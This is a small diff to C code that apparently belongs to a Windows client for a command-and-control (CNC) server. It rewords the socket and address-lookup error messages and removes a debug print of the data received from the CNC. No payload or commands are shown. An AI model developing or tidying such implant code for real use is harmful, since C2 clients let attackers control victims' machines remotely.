@@ -27,7 +27,7 @@ struct addrinfo getcncinfo() {
                                            .ai_protocol = IPPROTO_TCP};
   res = getaddrinfo(CNC_HOST, CNC_PORT, &hints, &result);
   if (res != 0) {
-    printf("getaddrinfo failed: %d\n", res);
+    printf("Failed to get CNC info: %d\n", res);
     WSACleanup();
     exit(1);
   }
@@ -39,7 +39,7 @@ void initcncsock() {
   SOCKET *conn = malloc(sizeof(SOCKET));
   *conn = socket(cncinfo.ai_family, cncinfo.ai_socktype, cncinfo.ai_protocol);
   if (*conn == INVALID_SOCKET) {
-    printf("Error at socket(): %d\n", WSAGetLastError());
+    printf("Error at CNC socket initialization: %d\n", WSAGetLastError());
     freeaddrinfo(&cncinfo);
     WSACleanup();
     exit(1);
@@ -80,6 +80,5 @@ char *recvfromcnc(int bufsize) {
     printf("Failed receiving from CNC: %d\n", WSAGetLastError());
     exit(1);
   }
-  printf("Received from CNC: %s\n", buf);
   return buf;
 }
